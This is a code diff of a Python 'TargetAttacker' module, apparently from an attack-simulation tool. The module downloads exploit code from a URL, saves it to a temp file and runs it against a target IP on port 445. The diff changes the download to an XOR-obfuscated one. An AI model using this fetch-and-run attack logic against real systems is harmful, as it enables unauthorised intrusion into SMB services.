@@ -14,28 +14,32 @@ logging.config.dictConfig(config)
 logger = logging.getLogger(__name__)
 
 from processor import Processor
-import requests
 import subprocess
 
 """
 {
-    "type": "attack_secu",
+    "type": "attack_target",
+    "src_ip" : "x.x.x.x",
+    "dst_ip" : "y.y.y.y",
+    "dst_port" : 445
     "download": f"http://localhost:9000/exploit/{id}",
-    "target_ip": "172.30.1.24",
-    "target_port": 445,
+    "file_size": 1000,
     "usage": "python <FILE> <IP>",
-}
+},
 """
 class TargetAttacker(Processor):
-    fields = ["download", "target_ip", "target_port", "usage"]
     signature = b"BAScope"
+    FIELDS = ["dst_ip", "dst_port", "download", "file_size", "usage"]
 
     def __init__(self, cmd):
         super().__init__(cmd)
-        self.check_cmd(self.fields)
+        self.check_cmd(self.FIELDS)
         self.path = str(parent) + "/tmp/ex.py"
+        logger.info(f"[target] cmd: {cmd}")
         logger.debug(f"[target] file: {self.path}")
+
         return
+
 
     def run_cmd(self, debug):
         self.debug = debug
@@ -46,10 +50,7 @@ class TargetAttacker(Processor):
         if self.debug:
             pass
         else:
-            # 다운로드 받은 공격코드를 임시 디렉토리에 저장함
-            r = requests.get(self.link)
-            with open(self.path, "w") as f:
-                f.write(r.text)
+            self.xor_download(self.link, self.path)
 
         replacements = [
             ("<FILE>", self.path),
@@ -62,9 +63,11 @@ class TargetAttacker(Processor):
 
         return
 
+
     def report(self):
-        # attack target 모드에서는 무엇을 보고해야할까?
-        return {}
+        # attack target 모드에서는 보고할 것이 없음.
+        return
+
 
 if __name__ == '__main__':
     msg = {
@@ -78,3 +81,4 @@ if __name__ == '__main__':
     a = TargetAttacker(msg)
     a.run_cmd(debug = True)
     a.report()
+
